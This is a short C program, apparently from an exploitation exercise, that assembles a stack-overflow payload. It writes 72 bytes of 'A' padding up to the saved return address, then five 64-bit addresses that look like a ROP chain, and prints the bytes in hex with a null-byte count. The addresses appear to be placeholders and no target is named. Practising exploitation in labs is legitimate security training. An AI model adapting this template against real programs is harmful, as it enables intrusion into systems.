#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>

#define OFFSET_TO_RIP 72
#define MAX_PAYLOAD 512

static void pack64(uint8_t *buf, size_t offset, uint64_t val) {
    *(uint64_t *) (buf + offset) = val;
}

int main(void) {
    uint8_t payload[MAX_PAYLOAD] = {0};
    size_t off = 0;

    memset(payload, 0x41, OFFSET_TO_RIP);
    off = OFFSET_TO_RIP;

    pack64(payload, off, 0x0000000140001111ULL);
    off += 8;
    pack64(payload, off, 0x0000000140002221ULL);
    off += 8;
    pack64(payload, off, 0x0000000140003331ULL);
    off += 8;
    pack64(payload, off, 0x0000000140004441ULL);
    off += 8;
    pack64(payload, off, 0x0000000140005551ULL);
    off += 8;

    printf("[+] payload: %zu bytes\n", off);

    for (int i = 0; i < OFFSET_TO_RIP; ++i) {
        if (payload[i] != 0x41) {
            printf("[-] padding corrupto\n");
            return 1;
        }
    }
    printf("[+] padding verificado\n");

    printf("[+] payload completo\n");
    for (size_t i = 0; i < off; i++) {
        printf("%02x ", payload[i]);
        if ((i + 1) % 16 == 0) {
            printf("\n");
        }
    }

    printf("\n");
    size_t nulls = 0;
    for (size_t i = 0; i < off; i++) {
        if (payload[i] == 0x00) {
            nulls++;
        }
    }
    printf("[-] nulls bytes: %zu\n", nulls);

    return 0;
}
